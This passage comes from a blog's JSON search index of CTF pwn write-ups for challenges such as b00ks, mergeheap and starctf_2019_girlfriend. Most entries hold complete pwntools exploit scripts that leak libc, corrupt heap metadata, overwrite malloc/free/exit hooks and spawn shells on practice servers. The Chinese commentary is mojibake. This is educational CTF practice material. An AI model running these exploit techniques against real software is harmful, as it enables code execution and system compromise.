p.sendlineafter(&#39;Command: &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def full(index,size,content): p.sendlineafter(&#39;Command: &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Size: &#39;,str(size)) p.sendlineafter(&#39;Content: &#39;,content) def free(index): p.sendlineafter(&#39;Command: &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) def show(index): p.sendlineafter(&#39;Command: &#39;,&#39;4&#39;) p.sendlineafter(&#39;Index:&#39;,str(index)) add(0x10) #0 add(0x10) #1 add(0x10) #2 add(0x10) #3 add(0x80) #4 free(1) free(2) payload=p64(0)*3+p64(0x21)+p64(0)*3+p64(0x20)+p8(0x80) full(0,0x41,payload) payload=p64(0)*3+p64(0x21) full(3,0x20,payload) add(0x10) #1 add(0x10) #2--&gt;4 payload=p64(0)*3+p64(0x91) full(3,0x20,payload) add(0x30) #é˜²æ­¢åˆå¹¶ free(4) show(2) p.recvuntil(&quot;Content:&quot;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-88 print(hex(main_addr)) base=main_addr-0x10-libc.sym[&#39;__malloc_hook&#39;] system=base+libc.sym[&#39;system&#39;] add(0x60) #4 free(4) fake_addr=main_addr-0x10-0x23 full(2,0x8,p64(fake_addr)) &#39;&#39;&#39; or payload=p64(0)*3+p64(0x71)+p64(fake_addr) full(3,0x28,payload) &#39;&#39;&#39; gdb.attach(p) sleep(1) add(0x60) #5 add(0x60) #6 one=[0x45216,0x4526a,0xf02a4,0xf1147] one_gadget=base+one[1] payload=b&#39;a&#39;*0x13+p64(one_gadget) full(6,0x1b,payload) add(0x10) p.interactive()","categories":[],"tags":[]},{"title":"SWPUCTF_2019_login","slug":"SWPUCTF-2019-login","date":"2024-03-12T12:48:45.000Z","updated":"2024-03-13T11:10:59.577Z","comments":true,"path":"2024/03/12/SWPUCTF-2019-login/","link":"","permalink":"http://example.com/2024/03/12/SWPUCTF-2019-login/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"STKOF","slug":"stkof","date":"2024-03-11T12:53:15.000Z","updated":"2024-03-16T14:10:03.790Z","comments":true,"path":"2024/03/11/stkof/","link":"","permalink":"http://example.com/2024/03/11/stkof/","excerpt":"","text":"ä¸¤é“ç¨‹åºé¢˜ï¼Œä¸€é“32ä½ä¸€é“64ä½ï¼Œéƒ½æ˜¯æ ˆæº¢å‡ºçš„é¢˜","categories":[],"tags":[]},{"title":"b00ks","slug":"b00ks","date":"2024-03-11T06:17:34.000Z","updated":"2024-03-11T08:25:17.302Z","comments":true,"path":"2024/03/11/b00ks/","link":"","permalink":"http://example.com/2024/03/11/b00ks/","excerpt":"","text":"ç”©åˆ°è„¸ä¸Šçš„off-by-one æ˜¯ä¸€ä¸ªå›¾ä¹¦ç®¡ç†ç³»ç»Ÿ è¿™é‡Œå¯ä»¥è¦†ç›–æ‰å­˜å †åœ°å€çš„ä¸€ä¸ªå­—èŠ‚ï¼Œå¯ä»¥å®ç°æ”¹å †åœ°å€çš„æ“ä½œ æ‰“å°çš„æ—¶å€™ä¼šè¿å †åœ°å€ä¹Ÿæ‰“å°å‡ºæ¥ add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) add(0x10,&#39;eeeeeeee&#39;,0x10,&#39;ffffffff&#39;) free(2) edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20)) expfrom pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,25494) #p=process(&quot;./b00ks&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) elf=ELF(&#39;./b00ks&#39;) payload=b&#39;k&#39;*0x1f+b&#39;b&#39; p.sendlineafter(&#39;Enter author name: &#39;,payload) def add(size1,content1,size2,content2): p.sendlineafter(&#39;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Enter book name size:&#39;,str(size1)) p.sendlineafter(&#39;Enter book name (Max 32 chars):&#39;,content1) p.sendlineafter(&#39;Enter book description size:&#39;,str(size2)) p.sendlineafter(&#39;Enter book description:&#39;,content2) def edit(idd,content): p.sendlineafter(&#39;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Enter the book id you want to edit: &#39;,str(idd)) p.sendlineafter(&#39;Enter new book description: &#39;,content) def show(): p.sendlineafter(&#39;&gt; &#39;,&#39;4&#39;) def free(idd): p.sendlineafter(&#39;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Enter the book id you want to delete: &#39;,str(idd)) def ren(content): p.sendlineafter(&#39;&gt; &#39;,&#39;5&#39;) p.sendlineafter(&#39;Enter author name: &#39;,content) add(0xd0,&#39;aaaaaaaa&#39;,0x20,&#39;bbbbbbb&#39;) #1 show() p.recvuntil(&quot;kb&quot;) heap_addr=u64(p.recv(6)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;addr&#39;+hex(heap_addr)) add(0x80,&#39;cccccccc&#39;,0x60,&#39;dddddddd&#39;) #2 add(0x10,&#39;bin/sh&#39;,0x10,&#39;ffffffff&#39;) #3 free(2) edit(1,p64(1)+p64(heap_addr+0x30)+p64(heap_addr+0x30+0x90+0xe0+0x10)+p64(0x20)) ren(&#39;a&#39;*0x20) show() p.recvuntil(&#39;Name: &#39;) main_addr=u64(p.recvuntil(&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;))-88 malloc_hook=main_addr-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] system=base+libc.sym[&#39;system&#39;] print(&#39;main_addr&#39;+hex(main_addr)) edit(1,p64(free_hook)+p64(0x20)) edit(3,p64(system)) free(3) #gdb.attach(p) sleep(1) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"freenote_x64","slug":"freenote-x64","date":"2024-03-10T12:50:45.000Z","updated":"2024-03-10T13:14:09.298Z","comments":true,"path":"2024/03/10/freenote-x64/","link":"","permalink":"http://example.com/2024/03/10/freenote-x64/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"jiandan_pwn1","slug":"jiandan-pwn1","date":"2024-03-09T09:02:00.000Z","updated":"2024-03-09T12:52:23.494Z","comments":true,"path":"2024/03/09/jiandan-pwn1/","link":"","permalink":"http://example.com/2024/03/09/jiandan-pwn1/","excerpt":"","text":"ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚è¾“å…¥ï¼Œç„¶åv4åœ¨rbp-4çš„ä½ç½®ï¼Œç›´æ¥å‘é€p32(0x10d),0då…ˆæ”¾åœ¨å·¦è¾¹(\\x61)çš„ä½ç½®ï¼Œç„¶åæŠŠå€¼æ”¾åˆ°rsp+0x10dçš„ä½ç½®ï¼Œåé¢çš„è¾“å…¥ä¹Ÿä¸å½±å“v4çš„å€¼ã€‚ expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,27841) p=process(&quot;./jiandan_pwn1&quot;) context.log_level=&quot;debug&quot; puts_func=0x4007BF puts_plt=0x400590 puts_got=0x601018 pop_rdi=0x400843 libc=ELF(&#39;./libc-2.23.so&#39;) gdb.attach(p,&#39;b *0x400783&#39;) sleep(1) payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(puts_got)+p64(puts_func) p.sendlineafter(&#39;Hack 4 fun!&#39;,payload) puts_got=u64(p.recvuntil(&#39;\\x7f&#39;).strip().ljust(8,b&#39;\\x00&#39;)) base=puts_got-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+next(libc.search(b&#39;bin/sh&#39;)) print(&#39;puts&#39;+hex(puts_got)) # payload=b&#39;a&#39;*(0x110-4)+p32(0x10d)+b&#39;a&#39;*8+p64(pop_rdi)+p64(binsh)+p64(system) p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"mergeheap","slug":"mergeheap","date":"2024-03-08T12:47:52.000Z","updated":"2024-03-09T07:39:30.617Z","comments":true,"path":"2024/03/08/mergeheap/","link":"","permalink":"http://example.com/2024/03/08/mergeheap/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€ï¼Œlibc-2.27,mallocå¤§å°é™åˆ¶äº†0x400ï¼Œæœ‰ä¸ªåˆå¹¶å †çš„å‡½æ•°ï¼Œå¯ä»¥åˆå¹¶å¤§äº0x400çš„ï¼Œä¸è¿‡é‡Šæ”¾çš„æ—¶å€™æ€»æ˜¯å’Œtop_chunkåˆå¹¶ã€‚æ‰€ä»¥å¾—ç”¨å¦ä¸€ç§æ–¹æ³•æ³„éœ²libc. add(0x210,&#39;aaaa&#39;) add(0x210,&#39;cccc&#39;) add(0x10,&#39;dddd&#39;) merge(0,1) free(3) free(2) è¿™ç§æ–¹æ³•å¥½åƒä¸è¡Œfor i in range(8): add(0x80,&#39;cccc&#39;) for i in range(1,8): free(i) free(0) add(0x8,&#39;cccccccc&#39;) show(0) p.recvuntil(&#39;cccccccc&#39;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) add(0x60,&#39;aaaa\\n&#39;) #1 add(0x30,&#39;a&#39;*0x30) #2 add(0x38,&#39;a&#39;*0x38) #3 add(0x100,&#39;a&#39;) #4 add(0x68,&#39;a&#39;) #5 add(0x20,&#39;a&#39;) #6 add(0x20,&#39;c&#39;) #7 add(0x20,&#39;f&#39;) #8 add(0x20,&#39;d&#39;) #9 free(5) free(7) free(8) merge(2,3) ä¸‹ä¸€ä¸ªå †çš„sizeä½å› ä¸ºå †2ï¼Œå †3çš„åˆå¹¶è¢«æ”¹äº†ï¼Œå…·ä½“ä¸å¤ªæ‡‚ free(6) expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,25860) p=process(&quot;./mergeheap&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) def add(size,content): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;len:&#39;,str(size)) p.sendlineafter(&#39;content:&#39;,content) def show(index): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;2&#39;) p.sendlineafter(&#39;idx:&#39;,str(index)) def free(index): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;3&#39;) p.sendlineafter(&#39;idx:&#39;,str(index)) def merge(index1,index2): p.sendlineafter(&#39;&gt;&gt;&#39;,&#39;4&#39;) p.sendlineafter(&#39;idx1:&#39;,str(index1)) p.sendlineafter(&#39;idx2:&#39;,str(index2)) for i in range(8): add(0x80,&#39;cccc&#39;) for i in range(1,8): free(i) free(0) add(0x8,&#39;cccccccc&#39;) show(0) p.recvuntil(&#39;cccccccc&#39;) main_addr=u64(p.recvuntil(b&#39;\\x7f&#39;).ljust(8,b&#39;\\x00&#39;)) print(hex(main_addr-0x80)) main_arena=main_addr-96-0x80 malloc=main_arena-0x10 base=malloc-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] one=[0x4f2c5,0x4f322,0x10a38c] one_gadget=base+one[1] add(0x60,&#39;aaaa\\n&#39;) #1 add(0x30,&#39;a&#39;*0x30) #2 add(0x38,&#39;a&#39;*0x38) #3 add(0x100,&#39;a&#39;) #4 add(0x68,&#39;a&#39;) #5 add(0x20,&#39;a&#39;) #6 add(0x20,&#39;c&#39;) #7 add(0x20,&#39;f&#39;) #8 add(0x20,&#39;d&#39;) #9 free(5) free(7) free(8) merge(2,3) free(6) payload=b&#39;a&#39;*0x28+p64(0x31)+p64(free_hook)+p64(0) add(0x100,payload) add(0x20,&#39;aaaa&#39;) add(0x20,&#39;cccc&#39;) add(0x20,p64(one_gadget)) free(9) #gdb.attach(p) sleep(1) p.interactive()","categories":[],"tags":[]},{"title":"bbctf_2020_write","slug":"bbctf-2020-write","date":"2024-03-08T11:12:10.000Z","updated":"2024-03-08T12:19:12.523Z","comments":true,"path":"2024/03/08/bbctf-2020-write/","link":"","permalink":"http://example.com/2024/03/08/bbctf-2020-write/","excerpt":"","text":"å¯ä»¥æ³„éœ²äº†puts_got,å¯ä»¥ç®—åç§»ï¼Œç¨‹åºå¯ä»¥æ”¹åœ°å€çš„å†…å®¹ï¼Œé‚£ä¹ˆå¯ä»¥æ”¹exit_hook,exitå‡½æ•°ä¼šæ‰§è¡Œrun_exit_handlersï¼Œç„¶åè¿™ä¸ªå‡½æ•°ä¼šè°ƒç”¨_dl_finiï¼Œç„¶åè¿™ä¸ª_dl_finiçš„æºç è°ƒç”¨äº† rtld_lock_lock_recursive å’Œ __rtld_lock_unlock_recursiveï¼Œæ‰€ä»¥åªéœ€è¦å‘å…¶ä¸­ä¸€ä¸ªå†™å…¥one_gadgetå°±è¡Œäº†ã€‚ä¸ºäº†ä»¥åæ–¹ä¾¿ï¼Œä»¥åå°±è¿™æ ·ç®—åœ¨libc-2.23ä¸­exit_hook = libc_base+0x5f0040+3848 exit_hook = libc_base+0x5f0040+3856 åœ¨libc-2.27ä¸­ exit_hook = libc_base+0x619060+3840 exit_hook = libc_base+0x619060+3848å…·ä½“çš„exit_hookå¯ä»¥çœ‹è¿™ï¼Œç„¶åç”¨one_gadget.ç„¶åè¾“å…¥çš„è¯å¾—ç”¨å­—ç¬¦ä¸²æ ¼å¼exit_hookåœ¨pwné¢˜ä¸­çš„åº”ç”¨](http://www.manongjc.com/detail/21-aktzmrsypltrrll.html)) from pwn import* from LibcSearcher import * p=remote(&quot;node5.buuoj.cn&quot;,29131) #p=process(&quot;./bbctf_2020_write&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) p.recvuntil(&#39;puts: &#39;) puts_addr=int(p.recv(14),16) base=puts_addr-libc.sym[&#39;puts&#39;] print(&#39;put&#39;+hex(puts_addr)) p.sendline(&#39;w&#39;) exit_hook=base++0x619060+3848 one=[0x4f2c5,0x4f322,0x10a38c] one_gadget=one[1]+base p.sendlineafter(&#39;ptr: &#39;,str(exit_hook)) p.sendlineafter(&#39;val: &#39;,str(one_gadget)) p.sendlineafter(&#39;(q)uit&#39;,&#39;q&#39;) #gdb.attach(p) #sleep(1) p.interactive()","categories":[],"tags":[]},{"title":"ciscn_2019_c_5","slug":"ciscn-2019-c-5","date":"2024-03-08T04:49:05.000Z","updated":"2024-03-08T07:13:56.626Z","comments":true,"path":"2024/03/08/ciscn-2019-c-5/","link":"","permalink":"http://example.com/2024/03/08/ciscn-2019-c-5/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€ æœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ä½†æ˜¯ç”¨%n$pä¹‹ç±»çš„ä¼šæŠ¥é”™ï¼Œç”¨%pä¸ä¼šï¼Œç®—å¾—åç§»æ˜¯8 p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;) p.recvuntil(&#39;59&#39;) io_stder=int(p.recv(14),16) æ¥æ”¶çš„è¯ä¸æ˜¯p.recvuntil(â€˜\\x59â€™)ï¼Œè€Œæ˜¯p.recvuntil(â€˜59â€™)ï¼Œè¿™é‡Œæˆ‘çŠ¯äº†ä¸ªé”™è¯¯ è¿™é‡Œå¯¹åº”ç¬¬ä¸ƒä¸ªå‚æ•° expfrom pwn import * p=process(&#39;./ciscn_2019_c_5&#39;) #p=remote(&#39;node5.buuoj.cn&#39;,28941) elf=ELF(&#39;./ciscn_2019_c_5&#39;) libc=elf.libc def add(size,story): p.sendlineafter(&#39;:&#39;,&#39;1&#39;) p.sendlineafter(&#39;story:&#39;,str(size)) p.sendlineafter(&#39;story:&#39;,story) def edit(): p.sendlineafter(&#39;:&#39;,&#39;2&#39;) def show(): p.sendlineafter(&#39;:&#39;,&#39;3&#39;) def free(idx): p.sendlineafter(&#39;:&#39;,&#39;4&#39;) p.sendlineafter(&#39;index:&#39;,str(idx)) def debug(): gdb.attach(p) sleep(1) p.sendlineafter(&#39;name?&#39;,&#39;%p%p%p%p%p%p%p&#39;) p.recvuntil(&#39;59&#39;) debug() io_stder=int(p.recv(14),16)#.ljust(8,b&#39;\\x00&#39;) p.sendlineafter(&#39;input your ID.&#39;,&#39;kkkk&#39;) base=io_stder-libc.sym[&#39;_IO_2_1_stderr_&#39;] system=base+libc.sym[&#39;system&#39;] print(&#39;io_st &#39;+hex(io_stder)+&#39;system &#39;+hex(system)) free_hook=base+libc.sym[&#39;__free_hook&#39;] add(0x60,&#39;aaaa&#39;) #0 add(0x60,&#39;bbbb&#39;) #1 add(0x60,&#39;bin/sh\\n&#39;) #2 free(0) free(1) free(0) add(0x60,p64(free_hook)) #3 add(0x60,&#39;aaaa&#39;) #4 add(0x60,&#39;dddd&#39;) #5 add(0x60,p64(system)) free(2) # p.interactive()","categories":[],"tags":[]},{"title":"starctf_2019_girlfriend","slug":"starctf-2019-girlfriend","date":"2024-03-06T13:48:39.000Z","updated":"2024-03-07T12:14:31.830Z","comments":true,"path":"2024/03/06/starctf-2019-girlfriend/","link":"","permalink":"http://example.com/2024/03/06/starctf-2019-girlfriend/","excerpt":"","text":"ä¿æŠ¤å…¨å¼€,æœ¬æƒ³ä»¥ç®€å•çš„uafå»è§£å†³ï¼Œä½†æ˜¯å´ä¼šå†…å­˜é”™è¯¯ï¼Œæ‰€ä»¥è¿™ä¸ªæ–¹æ³•ä¸è¡Œ from pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./starctf_2019_girlfriend&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def add(size,content1,content2): p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.sendlineafter(&quot;girl&#39;s name&quot;,str(size)) p.sendlineafter(&#39;please inpute her name:&#39;,content1) p.sendlineafter(&#39;please input her call:&#39;,content2) def show(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) def free(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) free(0) free(1) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-88 base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] system=base+libc.sym[&#39;system&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] add(0x20,&#39;dddd&#39;,&#39;eeee&#39;) add(0x20,&#39;/bin/sh&#39;,&#39;cccc&#39;) print(&#39;main_arena&#39;+hex(main_arena)) free(2) #2 free(3) #3 free(2) gdb.attach(p) sleep(1) add(0x20,p64(free_hook-0x10),&#39;dddd&#39;) add(0x20,&#39;cccc&#39;,&#39;dddd&#39;) add(0x20,&#39;eeee&#39;,&#39;vvvv&#39;) add(0x20,p64(system),&#39;dddd&#39;) p.interactive() é¦–å…ˆmallocä¸€ä¸ª0x80å¤§å°çš„å †ï¼Œå†ç”³è¯·0x60å¤§å°çš„ï¼Œåé¢æ”¹æˆæ¯”0x60å°çš„å †æ—¶éƒ½ä¼šå‡ºç°å†…å­˜æŠ¥é”™ï¼Œfreeå †0çš„æ—¶å€™ä¸ä¼šå’Œtopchunkåˆå¹¶ï¼Œå¾—åˆ°main_arena+88add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x60,&#39;cccc&#39;,&#39;ssss&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) free(0) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;main_arena&#39;+hex(main_arena)) malloc_hook=main_arena-88-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free(2) free(1) free(2) one = [0x45226, 0x4527a, 0xf03a4, 0xf1147] one_gadget=base+one[3] realloc=libc.sym[&#39;realloc&#39;]+base #è¿™é‡Œçš„è¯å¾—ç”¨åˆ° realloc_hook=malloc_hook-0x8add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23)) add(0x60,&#39;cccc&#39;,&#39;dddd&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39; malloc=&#39;+hex(malloc_hook-0x23)+&#39; realloc=&#39;+hex(realloc)) payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2) add(0x60,payload,&#39;cccc&#39;) ä½¿ç”¨one_gadgetçš„æ¡ä»¶ å…³äºreallocå‡½æ•°è°ƒæ•´å‡½æ•°æ ˆå¸§çš„çŸ¥è¯†ï¼Œå…³äºä¸ºä»€ä¹ˆç”¨realloc+2çš„åœ°å€é“¾æ¥æ–‡æœ¬) è°ƒè¯•å‘ç°é™¤äº†malloc_hook-0x23çš„åœ°å€å¯ä»¥æ”¹å…¶å®ƒçš„åœ°å€éƒ½ä¼šæŠ¥é”™ï¼Œå¤š1å°‘1éƒ½ä¸è¡Œ expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node5.buuoj.cn&quot;,25861) p=process(&quot;./starctf_2019_girlfriend&quot;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.23.so&#39;) def debug(): gdb.attach(p) sleep(1) def add(size,content1,content2): p.sendlineafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.sendlineafter(&quot;girl&#39;s name&quot;,str(size)) p.sendlineafter(&#39;please inpute her name:&#39;,content1) p.sendlineafter(&#39;please input her call:&#39;,content2) def show(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;2&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) def free(index): p.sendlineafter(&#39;Input your choice:&#39;,&#39;4&#39;) p.sendlineafter(&#39;Please input the index:&#39;,str(index)) #add(0x20,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x80,&#39;aaaa&#39;,&#39;bbbb&#39;) add(0x60,&#39;cccc&#39;,&#39;ssss&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) free(0) show(0) p.recvuntil(&#39;name:&#39;) main_arena=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) print(&#39;main_arena&#39;+hex(main_arena)) malloc_hook=main_arena-88-0x10 base=malloc_hook-libc.sym[&#39;__malloc_hook&#39;] free(2) free(1) free(2) one = [0x45226, 0x4527a, 0xf03a4, 0xf1147] one_gadget=base+one[3] realloc=libc.sym[&#39;realloc&#39;]+base add(0x60,p64(malloc_hook-0x23),p64(malloc_hook-0x23)) add(0x60,&#39;cccc&#39;,&#39;dddd&#39;) add(0x60,&#39;dddd&#39;,&#39;eeee&#39;) print(&#39;one_gadget=&#39;+hex(one_gadget)+&#39; malloc-0x23=&#39;+hex(malloc_hook-0x23)+&#39; realloc=&#39;+hex(realloc)) payload=b&#39;a&#39;*(0x13-8)+p64(one_gadget)+p64(realloc+2) add(0x60,payload,&#39;cccc&#39;) debug() p.sendafter(&#39;Input your choice:&#39;,&#39;1&#39;) p.interactive()","categories":[],"tags":[]},{"title":"ACTF_2019_message","slug":"ACTF-2019-message","date":"2024-03-05T11:24:11.000Z","updated":"2024-03-06T11:35:37.365Z","comments":true,"path":"2024/03/05/ACTF-2019-message/","link":"","permalink":"http://example.com/2024/03/05/ACTF-2019-message/","excerpt":"","text":"æœ‰uafæ¼æ´ï¼Œä½†æ˜¯æ‰“å°çš„è¯ä¼šæ£€æŸ¥sizeï¼Œæ‰€ä»¥ä¸èƒ½ç®€å•åœ°uaf add(0x200,&#39;aaaa&#39;) add(0x200,&#39;aaaa&#39;) free(0) free(0) add(0x200,p64(0x60204c)) add(0x200,&#39;aaaa&#39;) æˆåŠŸæ§åˆ¶å †æŒ‡é’ˆ payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20 add(0x200,payload) for i in range(8): add(0x80,&#39;aaaa&#39;) #8 for i in range(1,7): free(i) free(8) addçš„å¤§å°æ˜¯0x80ï¼Œä¿è¯äº†æ»¡çš„æ—¶ä¾¯çš„é‚£ä¸ªbinæ”¾åœ¨unsorted binï¼Œæœ€åä¸¤ä¸ªå€’åºé‡Šæ”¾ï¼Œé˜²æ­¢å’Œtop chunkåˆå¹¶free(7) å †7æŒ‡é’ˆæ˜¯main_arena+96 æˆ‘è¯•äº†è¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥showå‡ºæ¥ï¼Œä¸è¿‡editçš„æ—¶å€™ä¸èƒ½sendlineï¼Œä¸ç„¶ä¼šè¦†ç›–æ‰ä¸€ä¸ªå­—èŠ‚ï¼Œå¯¼è‡´showçš„åœ°å€å‡ºé”™ payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*12+p64(0x80) edit(0,payload) show(7) è¿™é‡Œå› ä¸ºç”¨sendlineæ‰€ä»¥å‡ºé”™äº† æˆ–è€…ç”¨å¸ˆå‚…çš„åšæ³•ï¼Œä¸è¿‡æˆ‘çš„æ›´ç®€å• edit(0,payload) for i in range(7): add(0x80,&#39;aaaa&#39;) add(0x8,&#39;aaaaaaa&#39;) #å †8ï¼Œä¼šåœ¨unsorted biné‡Œæ‹¿ show(8) r.recvuntil(&#39;The message: aaaaaaa&#39;) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-224 #è¿™é‡Œå‡0x80å†å‡96 #libc2.23å’Œ2.27éƒ½æ˜¯__malloc_hook=main_arena-0x10 print(&#39;main_&#39;+hex(main_arena)) base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook) edit(0,payload) edit(2,p64(system)) æœ€åæœ‰ä¸ªåœ°æ–¹å°±æ˜¯free(1)ä¼šæŠ¥é”™ï¼Œå¾—åˆ†å¼€æˆ–è€…æ‰‹åŠ¨ exp from pwn import* from LibcSearcher import * #r=remote(&quot;node5.buuoj.cn&quot;,29647) r=process(&quot;./ACTF_2019_message&quot;) context.log_level=&quot;debug&quot; context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;) libc=ELF(&#39;./libc-2.27.so&#39;) elf=ELF(&#39;./ACTF_2019_message&#39;) def choice(nu): r.sendlineafter(&#39;choice: &#39;, str(nu)) def add(size,content): choice(1) r.sendlineafter(&#39;length of message:\\n&#39;, str(size)) r.sendlineafter(&#39;input the message:\\n&#39;, content) def free(idx): choice(2) r.sendlineafter(&#39;you want to delete:\\n&#39;, str(idx)) def edit(idx, content): choice(3) r.sendlineafter(&#39;you want to edit:\\n&#39;, str(idx)) r.sendlineafter(&#39;edit the message:\\n&#39;, content ) def show(idx): choice(4) r.sendlineafter(&#39;want to display:\\n&#39;, str(idx)) add(0x200,&#39;aaaa&#39;) #0 add(0x200,&#39;aaaa&#39;) #1 free(0) free(0) add(0x200,p64(0x60204c)) add(0x200,&#39;aaaa&#39;) payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0)*20 add(0x200,payload) #0 for i in range(8): add(0x80,&#39;aaaa&#39;) #8 for i in range(1,7): free(i) free(8) free(7) edit(0,payload) for i in range(7): add(0x80,&#39;aaaa&#39;) add(0x10,&#39;aaaaaaa&#39;) show(8) r.recvuntil(&#39;The message: aaaaaaa&#39;) main_arena=u64(r.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;))-224 print(&#39;main_&#39;+hex(main_arena)) base=main_arena-0x10-libc.sym[&#39;__malloc_hook&#39;] free_hook=base+libc.sym[&#39;__free_hook&#39;] system=base+libc.sym[&#39;system&#39;] binsh=base+ next(libc.search(b&#39;/bin/sh&#39;)) print(hex(system)) payload=p64(1)+p64(0)+b&#39;\\x00&#39;*4+p64(0x200)+p64(0x60204c)+p64(0x80)+p64(binsh)+p64(0x80)+p64(free_hook) edit(0,payload) edit(2,p64(system)) #gdb.attach(r) #sleep(1) r.sendlineafter(&#39;choice: &#39;,&#39;2&#39;) r.sendlineafter(&#39;you want to delete:\\n&#39;,&#39;1&#39;) # æœ‰æ—¶å€™å¾—æ‰‹åŠ¨free(1),ä¸ç„¶æ‰“ä¸é€šï¼Œå¾ˆç¦»è°± #free(1) r.interactive()","categories":[],"tags":[]},{"title":"ACTF_2019_OneRepeater","slug":"ACTF-2019-OneRepeater","date":"2024-03-02T08:13:15.000Z","updated":"2024-03-02T17:45:47.653Z","comments":true,"path":"2024/03/02/ACTF-2019-OneRepeater/","link":"","permalink":"http://example.com/2024/03/02/ACTF-2019-OneRepeater/","excerpt":"","text":"æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæ®µï¼Œæ˜¯é“æ ¼å¼åŒ–å­—ç¬¦ä¸²é¢˜ï¼Œç”¨shellcodeåš 1è¾“å…¥ï¼Œä¼šæ‰“å°å˜é‡çš„æ ˆåœ°å€ï¼Œ2æ ¼å¼åŒ–ï¼Œå¯å¤šæ¬¡æ ¼å¼åŒ–ï¼Œè¿”å›åœ°å€å¾—åœ¨åŸæ¥çš„åŸºç¡€ä¸ŠåŠ 